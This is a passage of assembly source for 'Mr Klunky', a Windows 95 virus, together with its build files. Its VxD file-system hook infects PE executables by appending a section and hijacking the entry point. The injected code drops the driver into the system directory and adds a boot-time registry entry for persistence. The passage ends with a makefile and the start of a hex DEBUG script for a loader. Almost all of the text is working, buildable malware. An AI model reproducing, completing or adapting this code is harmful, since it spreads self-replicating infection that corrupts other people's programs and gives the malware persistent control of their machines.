      mov  eax, [ecx+Prev_PointerToRawData]   ; Previous section start...
      add  eax, [ecx+Prev_SizeOfRawData]      ; ...plus previous section size.
					      ;
      mov  My_PointerToRawData, eax	      ; Store it.

      ; Update the image size.
      pop  eax
      add  eax, [esi+edi+PE_SizeOfImage]      ; Current image size + VxD size..
                                              ; ..+ size of patch code.
					      ;
      mov  [esi+edi+PE_SizeOfImage], eax      ; Store it.

      ; Calculate entry point.
      mov  eax, [ecx+Prev_VirtualAddress]     ; Previous virtual address...
      add  eax, [ecx+Prev_VirtualSize]	      ; ...+ previous virtual size...
      mov  ebx, [esi+edi+PE_SectionAlignment] ; < .../ section alignment...
      xor  edx, edx			      ; <
      div  ebx				      ; <
      inc  eax				      ; ...+ one...
      mul  ebx				      ; ...* section alignment.
					      ;
      push [esi+edi+PE_AddressOfEntryPoint]   ; Save old entry point.
      mov  [esi+edi+PE_AddressOfEntrypoint], eax ; Store new entry point.

      ; Calculate integer for control return.
      pop  ebx				      ; EBX = Origional entry point.
      sub  eax, ebx			      ; New - Old.
      add  eax, (Magic - MrK_PE_Code_Start)   ; Allow for delta position.
      mov  ddOrigEntry, eax		      ; Save it.

      ; Append the new section.
      popad				      ; Restore registers.
					      ;
      pushad				      ; Save registers.
      push esi				      ;
      push edi				      ;
					      ;
					      ;
      xchg esi, edi			      ; < EDI = Position of new section.
      add  edi, ecx			      ; <
      mov  esi, My_Section		      ; ESI = Section to add.
      mov  ecx, (28h / 4)		      ; Size (in words) of a section.
      rep  movsd			      ; Do it!

      ; Write new section to the correct position in the file.
      mov  eax, 0D601h			      ; R0_WRITEFILE
      mov  ecx, PE_Patch_Size		      ; Write this many bytes.
      mov  esi, MrK_PE_Code_Start             ; From here.
      mov  edx, My_PointerToRawData	      ; This far into the file.
      VxDCall IFSMgr_Ring0_FileIO	      ;
      jc   CleanStackAndClose		      ; Error exit.
                                              ;
      mov  eax, 0D601h			      ; R0_WRITEFILE
      mov  ecx, _ddMrK_VxD_Size               ; Write this many bytes.
      mov  esi, lpVxDBuffer		      ; From here.
      mov  edx, My_PointerToRawData	      ; < This far into the file.
      add  edx, PE_Patch_Size		      ; <
      VxDCall IFSMgr_Ring0_FileIO	      ;
      jc   CleanStackAndClose		      ; Error exit.

      ; Write the file headers back to BOF.
      mov  eax, 0D601h			      ; R0_WRITEFILE
      pop  edi                                ;
      pop  esi                                ; Write from here.
      mov  ecx, [esi+edi+PE_SizeOfHeaders]    ; Write this many bytes.
      xor  edx, edx			      ; To file start.
      VxDCall IFSMgr_Ring0_FileIO	      ;

; If the MRK_Debug equation exists allow the VxD
; to keep a log of files infected.
IFDEF MRK_Debug
      popad                                   ; Restore regs.
      jmp  AppendLog                          ; Make a log entry.
ELSE
      jmp  AllOKClose                         ; All done.
ENDIF

    CleanStackAndCLose:
      ; Clear crap off stack.
      pop  eax                                ; Clear crap off stack.
      pop  eax                                ;

    AllOKClose:
      ; Restore regs.
      popad                                   ;

    CloseFuck:
      ; Dealloc buffer.
      call R0_Dealloc                         ; ESI = buffer handle.

      ; Close the file.
      mov  eax, 0D700h			      ; R0_CLOSEFILE
      VxdCall IFSMgr_Ring0_FileIO             ; EBX = handle.

    RestoreExit:
      ; Restore file attributes and exit.
      mov  eax, 4301h                         ; R0_FILEATTRIBUTES,SET_ATTRIBUTES
      mov  esi, lpNameBuffer                  ; Perform on this file.
      pop  ecx                                ; Restore attributes.
      VxDCall IFSMgr_Ring0_FileIO             ;

    DeallocContinue:
      ; Free up the buffer for the ASCII filespec.
      mov  esi, lpNameBuffer                  ; ESI = buffer.
      call R0_Dealloc                         ;

    Continue:
      mov  Already_Entered, 0		      ; Clear entered flag.

    No_Reentrancy:
      ; Pass control to the next handler,
      ; completing the origional operation.
      mov  ecx, 6			      ; Copy the parameters onto
      mov  ebx, 1Ch			      ; the stack. This ensures
    PushPos:				      ; a C compliant call stack.
      mov  eax, [ebp+ebx]		      ;
      push eax				      ;
      sub  ebx, 4			      ;
      loop PushPos			      ;

      ; Next handler.
      mov  eax, NextIFSHook                   ; Gimme the next handler.
      call [eax]                              ; Dereferenced call.

    BiBi:
      ; Handler clean up.
      pop  ecx                                ; < Restore registers.
      pop  ebx                                ; <

      ; Back to caller.
      add  esp, 18h			      ; Clear out the space we...
      leave				      ; grabbed and return to caller...
      ret				      ; C style.
    EndProc MRKLUNKY_FileHandler



    ; New section added to infected files.
    My_Section			equ $
    My_Name			db "MrKlunky" ; This is my section's name.
    My_PhysicalAddress		dd 00000000h  ; Unused.
    My_VirtualAddress		dd 00000000h  ; Map to this RVA.	; *
    My_SizeOfRawData		dd 00000000h  ; Total space used.	; *
    My_PointerToRawData 	dd 00000000h  ; Start of data.		; *
    My_PointerToRelocations	dd 00000000h  ; < Unused.
    My_PointerToLineNumbers	dd 00000000h  ; <
    My_NumberOfRelocations	dw 0000h      ; <
    My_NumberOfLineNumbers	dw 0000h      ; <
    My_Characteristics		dd 0E0000060h ; Exec+Read+Write+Code+Init'd.

    ; Misc data.
    Already_Entered	db 0
    lpVxDBuffer 	dd 0
    NextIFSHook 	dd 0
    lpNameBuffer	dd 0



; If the MRK_Debug equation exists allow the VxD
; to keep a log of files infected.
IFDEF MRK_Debug
    BeginProc AppendLog
      ; Close the file.                       ;
      mov  eax, 0D700h                        ; R0_CLOSEFILE
      VxdCall IFSMgr_Ring0_FileIO             ;

      ; Log all files processed.              ;
      pushfd                                  ;
      pushad                                  ;

      ; Go to string end.                     ;
      mov  edi, lpNameBuffer                  ; Go to the terminating 0.
      xor  al, al                             ;
      mov  ecx, MaxStringLen                  ;
      repne scasb                             ;

      ; Error check.
      or   ecx, ecx                           ; Did we hit buffer end?
      jz   xContinue                          ; Yup. Abort.

      ; New line.
      mov  al, 13d                            ; Terminate with a CR...
      stosb                                   ; ...for log file.

      ; How many chars to write.
      mov  eax, MaxStringLen                  ; 1000 - str len + 1.
      sub  eax, ecx                           ;
      inc  eax                                ;
      push eax                                ;

      ; Open log file.
      mov  eax, 0D501h                        ; R0_OPENCREAT_IN_CONTEXT
      mov  bl, 02                             ; Open for R/W in compatable mode.
      mov  bh, 0FFh                           ; Commit on write, return errors.
      xor  cx, cx                             ; File will have no attributes.
      mov  dl, 11h                            ; Create or Open.
      xor  dh, dh                             ; nope -> R0_NO_CACHE
      mov  esi, offset LogFile                ; Name of file to open.
      VxDCall IFSMgr_Ring0_FileIO             ;
                                              ;
      jc   xContinue                          ; Abort on error.
      xchg ebx, eax                           ; EBX = EAX = file handle.

      ; Get the size of the file.
      mov  eax, 0D800h                        ; R0_GETFILESIZE
      VxdCall IFSMgr_Ring0_FileIO             ;

      ; Write the string to the end of the file.
      xchg edx, eax                           ; EDX = Start write at file size.
      mov  eax, 0D603h                        ; R0_WRITEFILE_IN_CONTEXT.
      mov  esi, lpNameBuffer                  ; Write from here.
      pop  ecx                                ; Num bytes to write
      VxdCall IFSMgr_Ring0_FileIO             ;

    xCloseFuck:
      ; Close the log file.
      mov  eax, 0D700h                        ; R0_CLOSEFILE
      VxdCall IFSMgr_Ring0_FileIO             ;

    xContinue:
      ; Restore regs and flags.
      popad                                   ;
      popfd                                   ;

      ; Dealloc buffer.
      call R0_Dealloc                         ;

      jmp  RestoreExit
    EndProc AppendLog

    ; Filespec of log file.
    LogFile     db 'C:\LOG.LOG',0             ;

ENDIF






MrK_PE_Code_Start:
; *** PE patch code starts here ***

; The rest of the file is patched by the VxD and written to the new entry
; point of an infected program.

; It's job is to extract necessary function entry points from KERNEL32.DLL
; and use these to create the VxD file in the appropriate system directory
; (if it doesn't exist). It then loads the VxD file into memory and places
; an entry into the registry - ensuring that Mr Klunky is loaded every time
; Windows 95 boots.

; Finally control is passed to the origional host program.



; Use equations to calculate actual offsets of data items.
lpMrKlunkyLoad		equ (_lpMrKlunkyLoad - _Magic)
lpMrKlunkyVxd		equ (_lpMrKlunkyVxd - _Magic)
lpMrKlunkyFileName	equ (_lpMrKlunkyFileName - _Magic)
dbZeroByte		equ (_dbZeroByte - _Magic)
lpK32Name		equ (_lpK32Name - _Magic)
lpCloseHandle		equ (_lpCloseHandle - _Magic)
lpCreateFileA		equ (_lpCreateFileA - _Magic)
lpFlushFileBuffers	equ (_lpFlushFileBuffers - _Magic)
lpGetLastError		equ (_lpGetLastError - _Magic)
lpGetSystemDirectoryA	equ (_lpGetSystemDirectoryA - _Magic)
lpGetWindowsDirectoryA	equ (_lpGetWindowsDirectoryA - _Magic)
lpSetEndOfFile		equ (_lpSetEndOfFile - _Magic)
lpWriteFile		equ (_lpWriteFile - _Magic)
lpAA32Name		equ (_lpAA32Name - _Magic)
lpRegCloseKey		equ (_lpRegCloseKey - _Magic)
lpRegCreateKeyExA	equ (_lpRegCreateKeyExA - _Magic)
lpRegSetValueExA	equ (_lpRegSetValueExA - _Magic)
;lpFilePathBuffer        equ (_lpFilePathBuffer - _Magic)
dwNumBytesWritten	equ (_dwNumBytesWritten - _Magic)
lpStoredVxD             equ (_lpStoredVxD - _Magic)
dwBaseAddr		equ (_dwBaseAddr - _Magic)
dwModHandle		equ (_dwModHandle - _Magic)
dwUnnamedOffset 	equ (_dwUnnamedOffset - _Magic)
dwRegHandle		equ (_dwRegHandle - _Magic)
lpStart 		equ (_lpStart - _Magic)
lpMrKlunkyKey		equ (_lpMrKlunkyKey - _Magic)
lpStaticVxD		equ (_lpStaticVxD - _Magic)
dwGetProc		equ (_dwGetProc - _Magic)
lpGetProc_Rec		equ (_lpGetProc_Rec - _Magic)
dwGetMod		equ (_dwGetMod - _Magic)
lpGetMod_Rec		equ (_lpGetMod_Rec - _Magic)
ddMrK_VxD_Size          equ (_ddMrK_VxD_Size - _Magic)



    ; New entry point of all infected programs.
    Mr_Klunky PROC
      ; Save stuff.
      push eax                                ; This will be the return address.
      pushad                                  ; Save all registers.

      ; Voodoo!
      call Magic                              ; Get delta offset.
    Magic:                                    ;
    _Magic equ $                              ;
      pop  ebp                                ;

    ; Find KERNEL32.DLL's PE header, start
    ; where it is loaded.
    Get_K32_PE_Header:
      mov  edi, 0BFF70000h                    ; Start in KERNEL32's area.
      mov  ecx, 00001000h                     ; Scan this many bytes.
      mov  eax, 00004550h                     ; Scan for "PE\0\0"

    Find_PE:
      repne scasb                             ; Scan for "P".
      jne  RestoreHost                        ; Bomb if not found.

      cmp  [edi-1], eax                       ; Is this dword "PE/0/0"?
      jne  Find_PE                            ; Nope, scan next sequence.

    ; Do some checks to make sure this really
    ; is the PE header.
    Verify_PE_Header:
      dec  edi                                ; Back to PE signature.

      ; Check machine word.
      cmp  word ptr [edi+4], 014Ch            ; Is machine word i386?
      jne  Find_PE                            ; Nope, keep searching.

      ; Check optional header word.
      cmp  word ptr [edi+14h], 0              ; Is there an optional header?
      je   Find_PE                            ; Nope, keep searching.

      ; Check characteristic word.
      mov  bx, word ptr [edi+16h]             ; Get characteristics word.
      and  bx, 0F000h                         ; Unmask the bytes we need.
      cmp  bx, 2000h                          ; Is it 2000h (a DLL)?
      jne  Find_PE                            ; Nope, keep searching.

      ; Check image base field.
      cmp  dword ptr [edi+34h], 0BFF70000h    ; Image Base > KERNEL32 base?
      jl   Find_PE                            ; Nope, keep searching.

    ; It certainly is the PE header. Now locate
    ; the export data (.edata) section.
    Find_Export_Section:

      ; Save base address for use with RVAs.
      mov  eax, [edi+34h]                     ; Get the base address.
      mov  [ebp+dwBaseAddr], eax              ; Save it.

      ; Go to KERNEL32.DLL's first section.
      xor  eax, eax                           ; Go to first section.
      mov  ax, [edi+14h]                      ;
      add  eax, edi                           ;
      add  eax, 18h                           ;

      mov  cx, [edi+06h]                      ; Set up num sections to check.

    CheckSectionSignature:
      cmp  [eax], 'ade.'                      ; Is this dword ".eda"?
      jne  CheckNextSection                   ; Nope. Next secton.

      cmp  dword ptr [eax+4], 00006174h       ; "ta\0\0"
      je   ExtractExportFunctions             ; Yes. Found the export section.

    CheckNextSection:
      add  eax, 28h                           ; Next section please.
      dec  cx                                 ; Section checked.

      cmp  cx, 0                              ; Counter reached zero?
      jne  CheckSectionSignature              ; No. Check next section.

      jmp  RestoreHost                        ; Doh! No sections left. Bye.

    ; Now that we have the export section we
    ; need to extract the address of our two
    ; functions from it. This means we must
    ; traverse both the name array and address
    ; array.
    ExtractExportFunctions:
      ; Go to the export section.
      mov  ebx, [eax+0Ch]                     ; Section Virtual Address.
      add  ebx, [ebp+dwBaseAddr]              ; Plus base of DLL.

      ; Point to array of string pointers.
      mov  edi, [ebx+20h]                     ; Start RVA name address array.
      add  edi, [ebp+dwBaseAddr]              ; Plus base of DLL.

      ; Determine offset for unnamed functions.
      mov  ecx, [ebx+14h]                     ; Number of functions...
      sub  ecx, [ebx+18h]                     ; ...less number of names...
      mov  eax, 4                             ; ...times by four.
      mul  ecx                                ; Do it.
      mov  [ebp+dwUnnamedOffset], eax         ; Save it.

      ; Calculate number of double words in string pointer array.
      mov  ecx, [ebx+18h]                     ; Number of names...
      mov  eax, 4                             ; ...times by four.
      mul  ecx                                ; Do it.
      xchg ecx, eax                           ; CX=Num dwords.

      xchg edi, edx                           ; DX holds start of array.

    CheckFunctionName:
      sub  ecx, 4                             ; Next name.
      mov  edi, edx                           ; Base address...
      add  edi, ecx                           ; ...plus array index.
      mov  edi, [edi]                         ; Get RVA of name.
      add  edi, [ebp+dwBaseAddr]              ; Add base address.

      lea  esi, [ebp+lpGetProc_Rec]           ; GetProcAddress record.
      lea  eax, [ebp+dwGetProc]               ; Save entry point here.
      call ExtractAbsoluteAddress             ; Check this name for it.

      lea  esi, [ebp+lpGetMod_Rec]            ; GetModuleHandleA record.
      lea  eax, [ebp+dwGetMod]                ; Save entry point here.
      call ExtractAbsoluteAddress             ; Check this name for it.

      cmp  ecx, 0                             ; Checked all the names?
      jne  CheckFunctionName                  ; Nope. Check the next name.

      cmp  [ebp+dwGetProc], 0                 ; Did we get this address?
      je   RestoreHost                        ; Nope, bomb out.

      cmp  [ebp+dwGetMod], 0                  ; Did we get this address?
      je   RestoreHost                        ; Nope, bomb out.

    ; We have found the entry points for the
    ; functions we need. After we initialise
    ; them we may use *any* KERNEL32.DLL
    ; function with impunity!
    UseFunctions:
      ; Get KERNEL32 handle.
      lea  eax, [ebp+lpK32Name]               ; < "KERNEL32"
      push eax                                ; <
      mov  eax, [ebp+dwGetMod]                ;
      call eax                                ; Direct GetModuleHandleA call.

      mov  [ebp+dwModHandle], eax
      cmp  eax, 0                             ; Result == 0?
      je   RestoreHost                        ; Yep, bomb out.

    CheckSysDir:
      lea  eax, [ebp+lpGetSystemDirectoryA]   ; Dir to check.
      call CheckVxD                           ; Find/create VxD in dir.
      jnc  DynaLoadMrKlunky                   ; Created/found - not loaded.

    CheckWinDir:
      lea  eax, [ebp+lpGetWindowsDirectoryA]  ; Dir to check.
      call CheckVxD                           ; Find/create VxD in dir.
      jc   RestoreHost                        ; Already loaded/failure.

    DynaLoadMrKlunky:
      ; Dynaload.
      xor  ebx, ebx                           ; N/A.
      xor  edi, edi                           ; N/A.
      lea  esi, [ebp+lpMrKlunkyLoad]          ; Load the VxD.
      call OpenIt                             ; Do it.

      ; Store in registry.
      lea  eax, [ebp+lpAA32Name]              ; < "ADVAPI32"
      push eax                                ; <
      mov  eax, [ebp+dwGetMod]                ;
      call eax                                ; Direct GetModuleHandleA call.

      mov  [ebp+dwModHandle], eax             ; Save handle.
      cmp  eax, 0                             ; Result == 0?
      je   RestoreHost                        ; Yep, forget registry.

    UpdateRegistry:
      ; Make registry entry as follows so we get
      ; loaded when Windows 95 boots.
      ;   HKLM\CurrentControlSet\Services\VxD\MrKlunky
      ;     binary Start = 00
      ;     string StaticVxD = "MrKlunky.VxD"
      lea  eax, [ebp+lpRegCreateKeyExA]       ;
      call GetProcAddress                     ;
      jc   RestoreHost                        ;

      lea  ebx, [ebp+dwUnnamedOffset]         ; < lpdwDisposition - who cares?
      push ebx                                ; <
      lea  ebx, [ebp+dwRegHandle]             ;   < phkResult.
      push ebx                                ;   <
      push 0                                  ; lpSecurityAttributes.
      push 000F003Fh                          ; KEY_ALL_ACCESS
      push 0                                  ; REG_OPTION_NON_VOLATILE
      push 0                                  ; lpClass.
      push 0                                  ; Reserved.
      lea  ebx, [ebp+lpMrKlunkyKey]           ; < SubKey.
      push ebx                                ; <
      push 80000002h                          ; HKEY_LOCAL_MACHINE
      call eax

      cmp  eax, 0                             ; Was the return value 0?
      jne  RestoreHost                        ; Nope, error exit.

      mov  ebx, [ebp+dwRegHandle]             ; Key handle in EBX.

      lea  eax, [ebp+lpRegSetValueExA]        ;
      call GetProcAddress                     ;
      jc   CloseRegKey                        ;

      xchg eax, edi                           ; EDI = function address.

      push 01h                                ; Size.
      lea  eax, [ebp+dbZeroByte]              ; < Set value to 00h
      push eax                                ; <
      push 3h                                 ; REG_BINARY type.
      push 0                                  ; Reserved.
      lea  eax, [ebp+lpStart]                 ; < Set value for "Start".
      push eax                                ; <
      push ebx                                ; Registry key handle.
      call edi                                ;

      push 0Dh                                ; Size.
      lea  eax, [ebp+lpMrKlunkyFileName]      ; < Set value to "MrKlunky.VxD"
      push eax                                ; <
      push 1h                                 ; REG_SZ type.
      push 0                                  ; Reserved.
      lea  eax, [ebp+lpStaticVxD]             ; < Set value for "StaticVxD".
      push eax                                ; <
      push ebx                                ; Registry key handle.
      call edi                                ;

    CloseRegKey:
      lea  eax, [ebp+lpRegCloseKey]           ;
      call GetProcAddress                     ;
      jc   RestoreHost                        ;

      push ebx                                ;
      call eax                                ; Close key.

    RestoreHost:
      ; Return to host.
      db 081h, 0EDh                           ; < sub ebp, #Orig_Entry_Point#.
      ddOrigEntry dd 0                        ; <

     mov  [esp+(8*4)], ebp                    ; Set up return address on stack.
     popad                                    ; Restore all registers.
     ret                                      ; Go there!

    Mr_Klunky ENDP



  ; This proc checks whether the string pointed to by EDI contains the name of
  ; a desired funtion. If so it extracts the appropriate absolute address
  ; using variables and export section data (in EBX), placing it in the
  ; desired variable (the address of which is stored in EAX).
  ;
  ; Parameters :- EAX - Address of a variable the absolute address is to be
  ;                     saved in, if this is the function sought.
  ;               EBX - Address of start of export (.edata) section.
  ;               ECX - Function name array offset.
  ;               EDI - Address of the function name to check.
  ;               ESI - Pointer to the following structure :-
  ;                        DWORD - Size of the function name (including any
  ;                                NULLs) contained in the next item.
  ;                        BYTE  - Start of buffer containing desired
  ;                                function's name.
  ;               [dwBaseAddr]      - DWord containing base address for use
  ;                     with Relative Virtual Addresses (RVAs).
  ;               [dwUnnamedOffset] - DWord containing offset into function
  ;                     address array (to skip unnamed functions).
  ExtractAbsoluteAddress PROC
      pushad                                  ; Save everything.

      mov  ecx, [esi]                         ; Get string length.
      add  esi, 4                             ; Point to string
      rep  cmpsb                              ; Check the string.

      popad                                   ; Restore everything.

      jne  EAA_NotString                      ; This isn't the string - exit.

      xchg esi, eax                           ; ESI = dword for address.

      mov  eax, [ebx+1Ch]                     ; RVA of Function Address array.
      add  eax, [ebp+dwUnnamedOffset]         ; Plus unused function names.
      add  eax, [ebp+dwBaseAddr]              ; Plus DLL load address.
      add  eax, ecx                           ; Plus array offset.
      mov  eax, [eax]                         ; Get the address.
      add  eax, [ebp+dwBaseAddr]              ; Plus DLL load address.

      mov  [esi], eax                         ; Save the address.

    EAA_NotString:
      ret
  ExtractAbsoluteAddress ENDP



  ; This proc retrieves the entry point (returned in EAX) for the specified
  ; function (whose string is pointed to by EAX).
  GetProcAddress PROC
      push eax                                ; lpProcName.
      mov  eax, [ebp+dwModHandle]             ; < hModule.
      push eax                                ; <
      call [ebp+dwGetProc]                    ; Call GetProcAddress directly.

      cmp  eax, 0                             ; EAX = 0?
      jne  GetProcDone                        ; Nope, success.

      stc                                     ; Failure.

    GetProcDone:
      ret
  GetProcAddress ENDP



  OpenFile PROC
  ; This proc opens the file pointed to by file path buffer.
      lea  esi, [ebp+lpStoredVxD]             ; < Buffer to place file path in.
      add  esi, [ebp+ddMrK_VxD_Size]          ; <

  OpenIt  PROC
  ; This proc opens the file pointed to by ESI, open mode is specified by EBX,
  ; access mode is specified by EDI.
  ;
  ; The file handle is returned in EBX, CF set on error or clear on success.
      ; Get entry address for CreateFile.
      lea  eax, [ebp+lpCreateFileA]           ;
      call GetProcAddress                     ;
      jc   OpenFile_Error                     ; Error exit.

      ; Open the file as specified.
      push 0                                  ;
      push 00000027h                          ;
      push ebx                                ;
      push 0                                  ;
      push 0                                  ;
      push edi                                ;
      push esi                                ;
      call eax                                ;

      ; Check for error.
      cmp  eax, 0FFFFFFFFh                    ; Error?
      je   OpenFile_Error                     ; Yep, exit.

      ; Success return.
      xchg eax, ebx                           ; EBX = handle.
      clc                                     ; Success!
      ret

    OpenFile_Error:
      stc                                     ; Failure.
      ret

  OpenIt  ENDP
  OpenFile ENDP



  CheckVxD PROC
  ; This proc calls the function named by [EAX] (either "GetSystemDirectoryA"
  ; or "GetWindowsDirectoryA"), appends the returned directory with the name
  ; of the Mr Klunky's driver. It then attempts to create the file indicated
  ; by the constructed filespec.
  ;
  ; CF is clear on success, set on error.
      ; Get the specified directory.
      call GetProcAddress                     ; Retrieve entry point.
      jc   CheckVxD_Error                     ; Exit on error.
                                              ;
      mov  ebx, MaxStringLen                  ; Max size of string to return.
      push ebx                                ;
      lea  edi, [ebp+lpStoredVxD]             ; < Buffer to place string in.
      add  edi, [ebp+ddMrK_VxD_Size]          ; <
      push edi                                ;
      call eax                                ; Retrieve dir as string.
                                              ;
      cmp  eax, ebx                           ; Returned size > 1000d?
      jg   CheckVxD_Error                     ; Yep. Too big to handle.

      ; Check out the string
      add  edi, eax                           ; EDI = End of string (NULL).
      cmp  byte ptr [edi-1], 5Ch              ; Is the last character a '\'?
      jne  CheckVxD_NoStringFix               ; Nope, no fix needed.
      dec  edi                                ; Yep, better overwrite it.
    CheckVxD_NoStringFix:                     ;

      ; Append "\MrKlunky.VxD",0 to the path.
      lea  esi, [ebp+lpMrKlunkyVxD]           ; Source.
      mov  ecx, 14d                           ; Size.
      rep  movsb                              ; Do it.

      ; Open the file.
      mov  ebx, 1                             ; Create new file.
      mov  edi, 0C0000000h                    ; Open for read/write.
      call OpenFile                           ; Do it.
      jc   CheckVxD_Error                     ; Exit on error.

      ; Write the Stored VxD to the file.
      lea  eax, [ebp+lpWriteFile]             ; Get WriteFile() entry.
      call GetProcAddress                     ;
      jc   CheckVxD_Error                     ; Error exit.
                                              ;
      push 0                                  ; No overlapped IO.
      lea  edi, [ebp+dwNumBytesWritten]       ; < Var for num bytes written.
      push edi                                ; <
                                              ;
      db 068h                                 ; push ...
    _ddMrK_VxD_Size dd 000000000h              ; ... Number of bytes to write.
                                              ;
      lea  edi, [ebp+lpStoredVxD]             ; < Buffer to write from.
      push edi                                ; <
      push ebx                                ; File handle.
      call eax                                ; Call WriteFile().
                                              ;
                                              ; Correct num bytes written?
      db 066h, 081h, 0BDh                     ; cmp word ptr [ebp+ ...
      dd dwNumBytesWritten                    ; ... dwNumBytesWritten], ...
    _dwMrK_VxD_Size dw 00000h                 ; ... MrK_VxD_Size
                                              ;
      je   CheckVxD_WriteOK                   ; Yep. Good.
                                              ;
      xor  eax, eax                           ; Nope, flag write error.
                                              ;
    CheckVxD_WriteOK:                         ;
      xchg eax, edi                           ; Save return code.

      ; Set new EOF.
      lea  eax, [ebp+lpSetEndOfFile]          ; Get SetEndOfFile() entry.
      call GetProcAddress                     ;
      jc   CheckVxD_Error                     ; Error exit.
                                              ;
      push ebx                                ; File handle.
      call eax                                ; Call SetEndOfFile().
                                              ;
      xchg eax, esi                           ; Save returned result.

      ; Write all changes to disk.
      lea  eax, [ebp+lpFlushFileBuffers]      ; Get FlushFileBuffers() entry.
      call GetProcAddress                     ;
      jc   CheckVxD_Error                     ; Error exit.
                                              ;
      push ebx                                ; File handle.
      call eax                                ; Call FlushFileBuffers().

      ; Close the file.
      lea  eax, [ebp+lpCloseHandle]           ; Get CloseHandle() entry.
      call GetProcAddress                     ;
      jc   CheckVxD_Error                     ; Error exit.
                                              ;
      push ebx                                ; File handle.
      call eax                                ; Call CloseHandle();
                                              ;
      cmp  eax, 0                             ; Close error occurred?
      je   CheckVxD_Error                     ; Yep, error exit.

      cmp  esi, 0                             ; Set EOF error occurred?
      je   CheckVxD_Error                     ; Yep, error exit.

      cmp  edi, 0                             ; Write error occurred?
      je   CheckVxD_Error                     ; Yep, error exit.

      clc                                     ; Success.
      ret                                     ; Bibi.

    CheckVxD_Error:
      stc                                     ; Error.
      ret                                     ; Bibi.

  CheckVxD ENDP



    _lpMrKlunkyLoad               db "\\."
    _lpMrKlunkyVxd                db "\"
    _lpMrKlunkyFileName           db "MrKlunky.VxD"
    _dbZeroByte                   db 0

    _lpK32Name                    db "KERNEL32", 0
    ; KERNEL32 API functions.
    _lpCloseHandle                db "CloseHandle", 0
    _lpCreateFileA                db "CreateFileA", 0
    _lpFlushFileBuffers           db "FlushFileBuffers", 0
    _lpGetLastError               db "GetLastError", 0
    _lpGetSystemDirectoryA        db "GetSystemDirectoryA", 0
    _lpGetWindowsDirectoryA       db "GetWindowsDirectoryA", 0
    _lpSetEndOfFile               db "SetEndOfFile", 0
    _lpWriteFile                  db "WriteFile", 0

    _lpAA32Name                   db "ADVAPI32", 0
    ; ADVAPI32 API functions.
    _lpRegCloseKey                db "RegCloseKey", 0
    _lpRegCreateKeyExA            db "RegCreateKeyExA", 0
    _lpRegSetValueExA             db "RegSetValueExA", 0


    _dwNumBytesWritten            dd 0
    _dwBaseAddr                   dd 0
    _dwModHandle                  dd 0
    _dwUnnamedOffset              dd 0

    _dwRegHandle                  dd 0
    _lpStart                      db "Start", 0
    _lpMrKlunkyKey                db "SYSTEM\CurrentControlSet\Services\VxD\MrKlunky", 0
    _lpStaticVxD                  db "StaticVxD", 0

    _dwGetProc                    dd 0
    _lpGetProc_Rec                dd 15d
                                  db "GetProcAddress", 0

    _dwGetMod                     dd 0
    _lpGetMod_Rec                 dd 17d
                                  db "GetModuleHandleA", 0

    _lpStoredVxD equ $

  VxD_LOCKED_CODE_ENDS

VxD_LOCKED_DATA_ENDS


	END MRKLUNKY_Device_Init


;=[END MRKLUNKY.ASM]=========================================================


;=[BEGIN MRKLUNKY.DEF]=======================================================

VXD MRKLUNKY DYNAMIC
DESCRIPTION 'MRKLUNKY'
SEGMENTS
    _LPTEXT     CLASS 'LCODE'   PRELOAD NONDISCARDABLE
    _LTEXT      CLASS 'LCODE'   PRELOAD NONDISCARDABLE
    _LDATA      CLASS 'LCODE'   PRELOAD NONDISCARDABLE
    _TEXT       CLASS 'LCODE'   PRELOAD NONDISCARDABLE
    _DATA       CLASS 'LCODE'   PRELOAD NONDISCARDABLE
    CONST       CLASS 'LCODE'   PRELOAD NONDISCARDABLE
    _TLS        CLASS 'LCODE'   PRELOAD NONDISCARDABLE
    _BSS        CLASS 'LCODE'   PRELOAD NONDISCARDABLE
    _ITEXT      CLASS 'ICODE'   DISCARDABLE
    _IDATA      CLASS 'ICODE'   DISCARDABLE
    _PTEXT      CLASS 'PCODE'   NONDISCARDABLE
    _PDATA      CLASS 'PDATA'   NONDISCARDABLE SHARED
    _STEXT      CLASS 'SCODE'   RESIDENT
    _SDATA      CLASS 'SCODE'   RESIDENT
    _DBOSTART   CLASS 'DBOCODE' PRELOAD NONDISCARDABLE CONFORMING
    _DBOCODE    CLASS 'DBOCODE' PRELOAD NONDISCARDABLE CONFORMING
    _DBODATA    CLASS 'DBOCODE' PRELOAD NONDISCARDABLE CONFORMING
    _16ICODE    CLASS '16ICODE' PRELOAD DISCARDABLE
    _RCODE      CLASS 'RCODE'

EXPORTS
        MRKLUNKY_DDB @1

;=[END MRKLUNKY.DEF]=========================================================


;=[BEGIN MAKEFILE]===========================================================

NAME = MRKLUNKY

# 16-bit linker.
LINK = LINK

# Definitions for MASM 6 Assembler.
ASM    = ml
AFLAGS = -coff -DBLD_COFF -DIS_32 -W2 -c -Cx -Zm -DMASM6 -DDEBLEVEL=0
ASMENV = ML
LFLAGS = /VXD /NOD

# MASM 6 inference rules.
.asm.obj:
	set $(ASMENV)=$(AFLAGS)
        $(ASM) -Fo$*.obj $<

all : $(NAME).VXD

OBJS = MRKLUNKY.obj

MRKLUNKY.obj: MRKLUNKY.asm

$(NAME).VxD: $(NAME).def $(OBJS)
        link @<<$(NAME).lnk
$(LFLAGS) 
/OUT:$(NAME).VxD
/MAP:$(NAME).map
/DEF:$(NAME).def
$(OBJS)
<<

 @del *.exp>nul
 @del *.lib>nul
 @del *.map>nul
 @del *.obj>nul

;=[END MAKEFILE]=============================================================


;=[BEGIN MRKLUNKY.SCR]=======================================================

N LOAD-MRK.COM
E 0100 4D 5A C0 00 03 00 00 00 20 00 00 00 FF FF 00 00 
E 0110 00 00 00 00 00 00 00 00 3E 00 00 00 01 00 FB 61 
E 0120 6A 72 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0130 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0140 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0150 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0160 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0170 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 01A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 01B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 01C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 01D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
